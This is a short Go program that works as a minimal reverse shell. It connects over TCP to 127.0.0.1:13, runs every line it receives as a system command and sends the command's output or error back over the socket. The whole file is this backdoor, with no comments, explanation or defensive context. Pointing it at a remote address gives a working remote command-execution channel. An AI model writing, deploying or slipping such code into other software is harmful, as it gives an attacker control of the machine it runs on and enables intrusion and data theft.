package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	connect, _ := net.Dial("tcp", "127.0.0.1:13")

	for {
		message, _ := bufio.NewReader(connect).ReadString('\n')

		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(connect, "%s\n", err)
		}
		fmt.Fprintf(connect, "%s\n", out)
	}

}